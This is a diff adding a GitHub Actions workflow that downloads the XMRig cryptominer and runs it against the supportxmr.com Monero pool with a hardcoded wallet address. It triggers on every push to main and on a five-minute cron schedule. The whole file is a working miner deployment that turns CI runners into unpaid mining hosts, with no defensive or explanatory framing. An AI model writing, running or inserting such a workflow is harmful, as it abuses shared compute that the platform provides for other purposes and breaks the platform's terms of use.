@@ -1,0 +1,25 @@
+name: Mine Monero with XMRig
+
+on:
+  push:
+    branches:
+      - main
+  schedule:
+    - cron: '*/5 * * * *'  # Run every 5 minutes
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v2
+
+    - name: Set up XMRig
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y wget
+        wget https://github.com/xmrig/xmrig/releases/download/v6.16.3/xmrig-6.16.3-linux-x64.tar.gz
+        tar -xzf xmrig-6.16.3-linux-x64.tar.gz
+        cd xmrig-6.16.3
+        ./xmrig -o pool.supportxmr.com:3333 -u 45Exs3gLo7fW8fwosN7zaNH95LC88sL37TVRNx1d7gAXScQYRYTRpuETrUDnTr2BukS52XCoHMwEF9k1GLaGKcwu5P9feb6 -p x -k --donate-level 1
